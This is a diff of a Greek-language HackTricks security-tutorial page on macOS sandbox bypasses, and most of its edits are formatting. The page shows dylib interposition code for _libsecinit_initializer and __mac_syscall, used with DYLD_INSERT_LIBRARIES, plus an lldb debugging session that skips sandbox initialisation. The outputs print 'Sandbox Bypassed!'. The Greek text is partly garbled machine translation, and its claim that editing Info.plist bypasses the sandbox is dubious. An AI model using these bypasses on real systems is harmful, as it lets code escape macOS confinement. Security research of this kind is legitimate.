@@ -9,7 +9,7 @@
 * Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
@@ -42,13 +42,16 @@
 ### Κατάχρηση της λειτουργίας Open
 
 Στα [**τελευταία παραδείγματα παράκαμψης του sandbox του Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) μπορεί
+
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
+
 ### Εξουσιοδοτήσεις
 
 Σημειώστε ότι ακόμα κι αν ορισμένες **ενέργειες** επιτρέπονται από το **αμμοβολίστρα** αν μια εφαρμογή έχει μια συγκεκριμένη **εξουσιοδότηση**, όπως στο παράδειγμα:
+
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -58,15 +61,17 @@ ld: dynamic executables or dylibs must link with libSystem.dylib for architectur
 (global-name "com.apple.cfnetwork.cfnetworkagent")
 [...]
 ```
+
 ### Διάβαση Παράκαμψης
 
 Για περισσότερες πληροφορίες σχετικά με τη **Διάβαση Παράκαμψης**, ανατρέξτε στο:
 
-{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
-[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
+{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
+[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
 {% endcontent-ref %}
 
 #### Διάβαση Παράκαμψης του `_libsecinit_initializer` για την αποτροπή του sandbox
+
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -90,6 +95,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
+
 #### Ενδιάμεση `__mac_syscall` για την αποτροπή του Sandbox
 
 {% code title="interpose.c" %}
@@ -125,6 +131,7 @@ __attribute__((used)) static const struct interpose_sym interposers[] __attribut
 };
 ```
 {% endcode %}
+
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 
@@ -136,18 +143,21 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
+
 ### Αποσφαλμάτωση και παράκαμψη του Sandbox με το lldb
 
 Ας συντάξουμε μια εφαρμογή που θα πρέπει να είναι σε sandbox:
 
 {% tabs %}
-{% tab title="sand.c" %}
+{% tab title="undefined" %}
 ```c
 #include <stdlib.h>
 int main() {
 system("cat ~/Desktop/del.txt");
 }
 ```
+{% endtab %}
+
 {% tab title="entitlements.xml" %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -157,7 +167,6 @@ system("cat ~/Desktop/del.txt");
 </dict>
 </plist>
 ```
-{% tab title="Info.plist" %}
 
 Το αρχείο Info.plist είναι ένα αρχείο ρυθμίσεων που χρησιμοποιείται για να περιγράψει τις διάφορες ρυθμίσεις και δυνατότητες μιας εφαρμογής στο macOS. Περιέχει πληροφορίες όπως το όνομα της εφαρμογής, τον αριθμό έκδοσης, τον αριθμό της έκδοσης του λειτουργικού συστήματος που υποστηρίζεται και άλλες σχετικές ρυθμίσεις. Το Info.plist είναι σημαντικό για την ασφάλεια της εφαρμογής, καθώς περιέχει πληροφορίες για τις απαιτούμενες δικαιώματα και περιορισμούς πρόσβασης που επιβάλλονται από το sandbox του macOS.
 
@@ -165,7 +174,6 @@ system("cat ~/Desktop/del.txt");
 
 Για να παρακάμψετε το sandbox του macOS, μπορείτε να τροποποιήσετε το Info.plist της εφαρμογής. Αυτό μπορεί να γίνει με διάφορους τρόπους, όπως την προσθήκη επιπλέον δικαιωμάτων πρόσβασης ή την απενεργοποίηση των περιορισμών που επιβάλλονται από το sandbox. Ωστόσο, πρέπει να ληφθεί υπόψη ότι η παράκαμψη του sandbox μπορεί να αποτελέσει ασφαλειακό κίνδυνο και να επιτρέψει την πρόσβαση σε ευαίσθητες πληροφορίες ή λειτουργίες του συστήματος.
 
-{% endtab %}
 ```xml
 <plist version="1.0">
 <dict>
@@ -196,12 +204,14 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 {% hint style="danger" %}
 Η εφαρμογή θα προσπαθήσει να **διαβάσει** το αρχείο **`~/Desktop/del.txt`**, το οποίο ο **Sandbox δεν επιτρέπει**.\
 Δημιουργήστε ένα αρχείο εκεί, καθώς μόλις παρακάμψετε το Sandbox, θα μπορεί να το διαβάσει:
+
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
 {% endhint %}
 
 Ας εκτελέσουμε αποσφαλμάτωση στην εφαρμογή για να δούμε πότε φορτώνεται ο Αμμοδοχείο (Sandbox):
+
 ```bash
 # Load app in debugging
 lldb ./sand
@@ -278,6 +288,7 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
+
 {% hint style="warning" %}
 **Ακόμα και αν ο προστατευτικός τοίχος του Sandbox έχει παρακαμφθεί, το TCC** θα ζητήσει από τον χρήστη να επιτρέψει στη διεργασία να διαβάσει αρχεία από την επιφάνεια εργασίας.
 {% endhint %}
@@ -297,7 +308,7 @@ Process 2517 exited with status = 0 (0x00000000)
 * Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
